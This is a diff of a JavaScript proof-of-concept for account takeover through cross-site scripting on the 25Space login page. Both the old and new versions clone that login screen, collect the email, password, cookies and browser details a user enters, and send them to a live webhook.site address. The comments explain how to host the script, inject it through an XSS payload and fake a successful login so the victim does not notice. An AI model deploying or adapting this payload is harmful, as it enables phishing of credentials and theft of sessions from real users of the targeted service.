@@ -1,188 +1,225 @@
-// Improved PoC script for ATO via XSS - Clones the EXACT 25Space login page look
-// Dark theme, orange accents, background image, logo, real QR placeholder, orange SignIn button
-// Exfiltrates email, password, cookies to your webhook
-// Replace 'https://your-webhook.site/your-unique-url' with your actual webhook
+// Ultimate PoC for ATO via XSS: Full page takeover cloning exact 25Space login
+// Replaces entire document with cloned page - looks identical, loads relative images from domain
+// On submit, exfils creds + cookies to webhook, then "logs in" by removing overlay or reloading
+// Host this JS on your GitHub, inject via XSS payload
+// IMPORTANT: Inspect real page (F12 > Network tab) to confirm exact image paths (e.g., /assets/images/logo.png, /assets/images/bg.jpg, QR src)
+// Replace placeholders in <img src> and background-url below with exact paths for 100% match
+// Test: Enter fake creds, check webhook for capture. Show ATO by logging into real account with captured data.
 
-function createExactLoginOverlay() {
-  // Full screen overlay
-  const overlay = document.createElement('div');
-  overlay.style.position = 'fixed';
-  overlay.style.top = '0';
-  overlay.style.left = '0';
-  overlay.style.width = '100vw';
-  overlay.style.height = '100vh';
-  overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
-  overlay.style.backgroundImage = 'url("https://cloud.25space.com/assets/images/login-bg.jpg")'; // Approximate background - adjust if you find exact
-  overlay.style.backgroundSize = 'cover';
-  overlay.style.backgroundPosition = 'center';
-  overlay.style.zIndex = '99999';
-  overlay.style.display = 'flex';
-  overlay.style.alignItems = 'center';
-  overlay.style.justifyContent = 'center';
-  overlay.style.color = '#fff';
-  overlay.style.fontFamily = 'Arial, sans-serif';
+(function() {
+  const webhookUrl = 'https://webhook.site/c47a99a0-d241-401a-888d-e44e31dbb274'; // Replace with your webhook
 
-  // Main container
-  const container = document.createElement('div');
-  container.style.display = 'flex';
-  container.style.width = '90%';
-  container.style.maxWidth = '1200px';
-  container.style.height = '80vh';
+  const fullPageHTML = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cloud Management Suite - Login</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-image: url('/assets/images/login-background.jpg'); /* Replace with exact bg path, e.g., /images/good-morning-bg.jpg */
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      color: white;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .container {
+      display: flex;
+      height: 100vh;
+      max-width: 1200px;
+      margin: 0 auto;
+      width: 100%;
+    }
+    .left {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 2rem;
+      background: rgba(0, 0, 0, 0.1); /* Slight overlay if needed */
+    }
+    .left h1 {
+      font-size: 3.5rem;
+      font-weight: 300;
+      margin-bottom: 1rem;
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+    }
+    .left p {
+      font-size: 1.1rem;
+      line-height: 1.5;
+      margin-bottom: 2rem;
+      max-width: 80%;
+    }
+    .qr-code {
+      width: 200px;
+      height: 200px;
+      border: 4px solid white;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    }
+    .right {
+      flex: 1;
+      background: rgba(0, 0, 0, 0.75);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 3rem 2rem;
+    }
+    .logo {
+      width: 60px;
+      height: auto;
+      margin: 0 auto 1.5rem;
+      display: block;
+    }
+    .right h2 {
+      text-align: center;
+      font-size: 1.5rem;
+      font-weight: 300;
+      margin-bottom: 2rem;
+      color: #fff;
+    }
+    form {
+      width: 100%;
+      max-width: 350px;
+      margin: 0 auto;
+    }
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 1rem;
+      margin-bottom: 1rem;
+      background: #333;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      font-size: 1rem;
+      outline: none;
+    }
+    input[type="email"]::placeholder, input[type="password"]::placeholder {
+      color: #aaa;
+    }
+    .remember {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1.5rem;
+      color: #ccc;
+      font-size: 0.9rem;
+    }
+    .remember input[type="checkbox"] {
+      margin-right: 0.5rem;
+    }
+    .problems-link {
+      color: #ff9500;
+      text-decoration: none;
+      font-size: 0.9rem;
+    }
+    .problems-link:hover {
+      text-decoration: underline;
+    }
+    button {
+      width: 100%;
+      padding: 1rem;
+      background: #ff9500;
+      color: #000;
+      border: none;
+      border-radius: 25px;
+      font-size: 1.1rem;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #e68500;
+    }
+    .create-account {
+      text-align: center;
+      margin-top: 1.5rem;
+      color: #ccc;
+      font-size: 0.9rem;
+    }
+    .create-link {
+      color: #ff9500;
+      text-decoration: none;
+    }
+    .create-link:hover {
+      text-decoration: underline;
+    }
+    footer {
+      position: absolute;
+      bottom: 1rem;
+      left: 50%;
+      transform: translateX(-50%);
+      text-align: center;
+      color: #ccc;
+      font-size: 0.8rem;
+      width: 100%;
+    }
+    @media (max-width: 768px) {
+      .container { flex-direction: column; height: auto; }
+      .left, .right { padding: 1rem; }
+      .left h1 { font-size: 2.5rem; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <h1>Good morning!</h1>
+      <p>Use 25Space across any device on the go. Scan the QR code to continue on other devices.</p>
+      <img src="/assets/images/qr-login.png" alt="QR Code" class="qr-code"> <!-- Replace with exact QR path -->
+    </div>
+    <div class="right">
+      <img src="/assets/images/logo.png" alt="25Space Logo" class="logo"> <!-- Replace with exact logo path -->
+      <h2>Cloud Management Suite.</h2>
+      <form id="loginForm">
+        <input type="email" placeholder="Email" required>
+        <input type="password" placeholder="Password" required>
+        <div class="remember">
+          <label><input type="checkbox"> Remember me</label>
+          <a href="#" class="problems-link">Problems with login?</a>
+        </div>
+        <button type="submit">Sign in</button>
+        <div class="create-account">
+          Don't have an account? <a href="#" class="create-link">Create an account</a>
+        </div>
+      </form>
+    </div>
+  </div>
+  <footer>&copy; 2015-2025 25space.com - Legal - Privacy - About - Health</footer>
 
-  // Left side (greeting + QR)
-  const left = document.createElement('div');
-  left.style.flex = '1';
-  left.style.display = 'flex';
-  left.style.flexDirection = 'column';
-  left.style.justifyContent = 'center';
-  left.style.padding = '40px';
-
-  const goodMorning = document.createElement('h1');
-  goodMorning.textContent = 'Good morning!';
-  goodMorning.style.fontSize = '48px';
-  goodMorning.style.marginBottom = '20px';
-  left.appendChild(goodMorning);
-
-  const qrText = document.createElement('p');
-  qrText.textContent = 'Use 25Space across any device on the go. Scan the QR code to continue on other devices.';
-  qrText.style.fontSize = '18px';
-  qrText.style.marginBottom = '30px';
-  left.appendChild(qrText);
-
-  // Real-looking QR code (you can replace with actual base64 or image URL if you have it)
-  const qrImg = document.createElement('img');
-  qrImg.src = 'https://api.qrserver.com/v1/create-qr-code/?data=https://cloud.25space.com&size=200x200'; // Example QR
-  qrImg.alt = 'QR Code';
-  qrImg.style.width = '200px';
-  qrImg.style.height = '200px';
-  qrImg.style.border = '5px solid white';
-  left.appendChild(qrImg);
-
-  // Right side (form)
-  const right = document.createElement('div');
-  right.style.flex = '1';
-  right.style.display = 'flex';
-  right.style.flexDirection = 'column';
-  right.style.justifyContent = 'center';
-  right.style.alignItems = 'center';
-  right.style.backgroundColor = 'rgba(0, 0, 0, 0.6)';
-  right.style.padding = '40px';
-  right.style.borderRadius = '10px';
-
-  // Logo
-  const logo = document.createElement('img');
-  logo.src = 'https://cloud.25space.com/assets/images/logo.png'; // Approximate - replace with exact if known, or use text
-  logo.alt = '25Space Logo';
-  logo.style.width = '80px';
-  logo.style.marginBottom = '20px';
-  if (!logo.src.includes('logo')) logo.textContent = '25Space'; // Fallback
-  right.appendChild(logo);
-
-  const title = document.createElement('h2');
-  title.textContent = 'Cloud Management Suite.';
-  title.style.marginBottom = '30px';
-  title.style.fontSize = '24px';
-  right.appendChild(title);
-
-  // Form
-  const form = document.createElement('form');
-  form.style.width = '80%';
-
-  const emailInput = document.createElement('input');
-  emailInput.type = 'email';
-  emailInput.placeholder = 'Email';
-  emailInput.required = true;
-  emailInput.style.width = '100%';
-  emailInput.style.padding = '15px';
-  emailInput.style.marginBottom = '20px';
-  emailInput.style.backgroundColor = '#333';
-  emailInput.style.border = 'none';
-  emailInput.style.borderRadius = '5px';
-  emailInput.style.color = '#fff';
-  emailInput.style.fontSize = '16px';
-  form.appendChild(emailInput);
-
-  const passInput = document.createElement('input');
-  passInput.type = 'password';
-  passInput.placeholder = 'Password';
-  passInput.required = true;
-  passInput.style.width = '100%';
-  passInput.style.padding = '15px';
-  passInput.style.marginBottom = '20px';
-  passInput.style.backgroundColor = '#333';
-  passInput.style.border = 'none';
-  passInput.style.borderRadius = '5px';
-  passInput.style.color = '#fff';
-  passInput.style.fontSize = '16px';
-  form.appendChild(passInput);
-
-  const remember = document.createElement('div');
-  remember.style.display = 'flex';
-  remember.style.justifyContent = 'space-between';
-  remember.style.marginBottom = '30px';
-  remember.style.fontSize = '14px';
-
-  const rememberLabel = document.createElement('label');
-  rememberLabel.innerHTML = '<input type="checkbox" style="margin-right:8px;"> Remember me';
-  remember.appendChild(rememberLabel);
-
-  const problemsLink = document.createElement('a');
-  problemsLink.textContent = 'Problems with login?';
-  problemsLink.href = '#';
-  problemsLink.style.color = '#ffa500';
-  problemsLink.style.textDecoration = 'none';
-  remember.appendChild(problemsLink);
-
-  form.appendChild(remember);
-
-  const signinBtn = document.createElement('button');
-  signinBtn.type = 'submit';
-  signinBtn.textContent = 'SignIn';
-  signinBtn.style.width = '100%';
-  signinBtn.style.padding = '15px';
-  signinBtn.style.backgroundColor = '#ffa500';
-  signinBtn.style.color = '#000';
-  signinBtn.style.fontWeight = 'bold';
-  signinBtn.style.border = 'none';
-  signinBtn.style.borderRadius = '30px';
-  signinBtn.style.cursor = 'pointer';
-  signinBtn.style.fontSize = '18px';
-  form.appendChild(signinBtn);
-
-  const createAccount = document.createElement('p');
-  createAccount.innerHTML = 'Don\'t have an account? <a href="#" style="color:#ffa500;">Create an account</a>';
-  createAccount.style.marginTop = '20px';
-  createAccount.style.textAlign = 'center';
-  form.appendChild(createAccount);
-
-  right.appendChild(form);
-
-  container.appendChild(left);
-  container.appendChild(right);
-  overlay.appendChild(container);
-  document.body.appendChild(overlay);
-
-  // Exfiltration on submit
-  form.addEventListener('submit', function(e) {
-    e.preventDefault();
-    const data = {
-      email: emailInput.value,
-      password: passInput.value,
-      cookies: document.cookie,
-      url: window.location.href
-    };
-
-    fetch('https://webhook.site/c47a99a0-d241-401a-888d-e44e31dbb274', {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data)
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const formData = new FormData(this);
+      const data = {
+        email: this.querySelector('input[type="email"]').value,
+        password: this.querySelector('input[type="password"]').value,
+        remember: this.querySelector('input[type="checkbox"]').checked,
+        cookies: document.cookie,
+        userAgent: navigator.userAgent,
+        url: window.location.href
+      };
+      fetch('${webhookUrl}', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      }).then(() => {
+        // Simulate successful login: redirect to dashboard or reload
+        alert('Login successful!'); // Or window.location.href = '/dashboard';
+        // window.location.reload();
+      }).catch(err => console.error('Exfil error:', err));
     });
+  </script>
+</body>
+</html>`;
 
-    // Optional: remove overlay after "login"
-    setTimeout(() => overlay.remove(), 1000);
-  });
-}
-
-// Run it
-createExactLoginOverlay();
+  // Replace the entire page
+  document.open();
+  document.write(fullPageHTML);
+  document.close();
+})();
